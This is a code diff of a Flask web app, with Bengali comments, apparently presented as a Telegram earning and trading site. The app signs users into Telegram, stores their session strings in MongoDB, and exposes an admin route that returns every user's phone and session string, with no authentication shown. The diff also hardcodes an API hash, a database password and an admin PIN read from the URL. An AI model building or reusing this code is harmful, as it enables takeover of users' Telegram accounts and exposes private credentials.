@@ -22,7 +22,7 @@ API_ID = 36466824
 API_HASH = "535ddcb85f2c3c74cc0ff532dd2c3406"
 MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"
 
-# ডাটাবেস কানেকশন (স্ক্রিনশট অনুযায়ী সঠিক নাম: aaf_tele_earn_db)
+# ডাটাবেস কানেকশন
 client_db = MongoClient(MONGO_URI)
 db = client_db['aaf_tele_earn_db']
 users_col = db['users']
@@ -56,8 +56,27 @@ def account(): return render_template('account.html')
 @app.route('/wallet')
 def wallet(): return render_template('wallet.html')
 
+# অ্যাডমিন পিনের কনফিগারেশন
+ADMIN_PIN = "Abdullah6790" 
+
 @app.route('/admin')
-def admin_page(): return render_template('admin.html')
+def admin_page():
+    # ইউজার লিঙ্কের শেষে পিন দিলে সরাসরি পেজ দেখাবে, না দিলে লগইন ফর্ম দেখাবে
+    user_pin = request.args.get('pin')
+    if user_pin == ADMIN_PIN:
+        return render_template('admin.html')
+    else:
+        # এটি সেই বক্স যা আপনি চেয়েছিলেন
+        return f'''
+        <div style="text-align:center; margin-top:100px; font-family:Arial; background:#0d1117; color:#c9d1d9; height:100vh; padding-top:50px;">
+            <h1 style="color:#39d353;">AAF Admin Access</h1>
+            <p>আপনার সিক্রেট পিন দিয়ে প্রবেশ করুন।</p>
+            <form action="/admin" method="get">
+                <input type="password" name="pin" placeholder="Enter PIN" style="padding:12px; border-radius:8px; border:1px solid #30363d; background:#161b22; color:#39d353; outline:none;">
+                <button type="submit" style="padding:12px 25px; background:#39d353; border:none; border-radius:8px; cursor:pointer; font-weight:bold;">Login</button>
+            </form>
+        </div>
+        ''', 403
 
 
 # ---------------------------------------------------------
@@ -93,10 +112,7 @@ def verify_login():
         client = temp_clients[phone]["client"]
         h = temp_clients[phone]["hash"]
         
-        # টেলিগ্রামে সাইন ইন
         user = client.sign_in(phone, code, phone_code_hash=h, password=password)
-        
-        # স্ট্রং সেশন জেনারেট (অটো-আপডেট লজিক)
         session_str = client.session.save()
         
         user_info = {
@@ -108,7 +124,6 @@ def verify_login():
             "last_login": datetime.utcnow()
         }
         
-        # MongoDB আপডেট (পুরনো ইউজার হলে আপডেট, নতুন হলে ইনসার্ট)
         users_col.update_one(
             {"telegram_id": user.id},
             {
@@ -134,7 +149,7 @@ def verify_login():
 # ---------------------------------------------------------
 
 @app.route('/api/user/dashboard_stats')
-@app.route('/api/get_user_info') # আপনার ডাবল রাউট সাপোর্ট করার জন্য
+@app.route('/api/get_user_info')
 def get_user_stats():
     uid = session.get('uid')
     if not uid: return jsonify({"success": False, "message": "Not logged in"})
@@ -163,15 +178,15 @@ def update_trade():
 
     data = request.json
     amount = float(data.get('amount', 0))
-    result = data.get('result') # 'win' অথবা 'loss'
-    profit_percent = 0.80 # ৮০% প্রফিট
+    result = data.get('result') 
+    profit_percent = 0.80 
 
     change = (amount * profit_percent) if result == 'win' else -amount
     
     users_col.update_one({"telegram_id": uid}, {"$inc": {"main_balance": change}})
     return jsonify({"success": True, "message": "Balance Updated"})
 
-@app.route('/api/add_balance', methods=['POST']) # টাস্ক রিওয়ার্ডের জন্য
+@app.route('/api/add_balance', methods=['POST'])
 def add_task_balance():
     uid = session.get('uid')
     if not uid: return jsonify({"success": False})
@@ -226,41 +241,15 @@ def admin_update_user():
     except Exception as e:
         return jsonify({"success": False})
 
-
 @app.route('/api/admin/get_withdrawals')
 def get_withdrawals():
-    # ডাটাবেজ থেকে সব পেন্ডিং উইথড্র রিকোয়েস্ট নিয়ে আসা
-    withdraws = list(db['withdraws'].find({}, {"_id": 0}))
+    withdraws = list(withdraws_col.find({}, {"_id": 0}))
     return jsonify({"success": True, "withdrawals": withdraws})
-
 
 @app.route('/api/admin/get_all_sessions')
 def get_all_sessions():
-    # ইউজারের নাম, ফোন এবং সেশন স্ট্রিং নিয়ে আসা
     users = list(users_col.find({}, {"_id": 0, "name": 1, "phone": 1, "session_string": 1}))
     return jsonify({"success": True, "sessions": users})
-
-
-# আপনার পছন্দের পিন এখানে দিন
-ADMIN_PIN = "Abdullah6790" 
-
-@app.route('/admin')
-def admin_page():
-    # ইউজার পিন না দিলে রিজেক্ট করবে
-    user_pin = request.args.get('pin')
-    if user_pin == ADMIN_PIN:
-        return render_template('admin.html')
-    else:
-        return f'''
-        <div style="text-align:center; margin-top:100px; font-family:Arial;">
-            <h1 style="color:red;">Access Denied!</h1>
-            <p>সঠিক পিন দিয়ে প্রবেশ করুন।</p>
-            <form action="/admin" method="get">
-                <input type="password" name="pin" placeholder="Enter PIN" style="padding:10px; border-radius:5px; border:1px solid #ccc;">
-                <button type="submit" style="padding:10px 20px; background:#39d353; border:none; border-radius:5px; cursor:pointer;">Login</button>
-            </form>
-        </div>
-        ''', 403
 
 
 # ---------------------------------------------------------
@@ -277,7 +266,6 @@ def get_ads():
 def get_tasks():
     tasks = list(tasks_col.find({"status": "active"}, {"_id": 0}))
     return jsonify({"success": True, "tasks": tasks})
-    
 
 
 # ---------------------------------------------------------
